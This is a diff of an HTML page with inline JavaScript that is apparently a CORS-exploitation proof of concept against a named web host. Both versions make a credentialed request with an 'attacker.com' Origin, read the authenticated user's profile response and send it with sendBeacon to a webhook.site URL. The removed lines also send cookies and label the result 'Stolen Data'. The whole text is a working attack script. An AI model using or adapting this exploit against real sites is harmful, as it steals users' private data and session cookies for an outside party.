@@ -2,50 +2,24 @@
 <html>
 <body>
 <script>
-// 1. First verify CORS headers
-fetch('https://uc-heytap-web-test.wanyol.com/v2/profile.html', {
-  method: 'OPTIONS',
+// Enhanced CORS tester with debug output
+const targetUrl = 'https://uc-heytap-web-test.wanyol.com/v2/profile.html';
+const webhookUrl = 'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b';
+
+fetch(targetUrl, {
+  credentials: 'include',
   headers: { 'Origin': 'https://attacker.com' }
 })
 .then(res => {
-  console.log("CORS Headers:", [...res.headers.entries()]);
-  
-  // 2. If headers look vulnerable, proceed with exploit
-  return fetch('https://uc-heytap-web-test.wanyol.com/v2/profile.html', {
-    credentials: 'include',
-    headers: { 
-      'Origin': 'https://attacker.com',
-      'Accept': 'application/json' // Force JSON if possible
-    }
-  });
+  document.write(`<h2>Response Status: ${res.status}</h2>`);
+  return res.text();
 })
-.then(res => {
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
-  return res.text(); // Use .text() first in case response isn't JSON
-})
-.then(response => {
-  let data;
-  try {
-    data = JSON.parse(response); // Try parsing as JSON
-  } catch {
-    data = response; // Fallback to raw text
-  }
-  
-  console.log("Stolen Data:", data);
-  
-  // 3. Exfiltrate to webhook
-  navigator.sendBeacon(
-    'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b', 
-    JSON.stringify({
-      cookies: document.cookie,
-      origin: location.origin,
-      data: data
-    })
-  );
+.then(data => {
+  document.write(`<pre>${JSON.stringify(data, null, 2)}</pre>`);
+  navigator.sendBeacon(webhookUrl, data);
 })
 .catch(e => {
-  console.error("Full Error:", e);
-  document.body.innerHTML = `<pre>Error: ${e.message}</pre>`;
+  document.write(`<pre style="color:red">ERROR: ${e.message}</pre>`);
 });
 </script>
 </body>
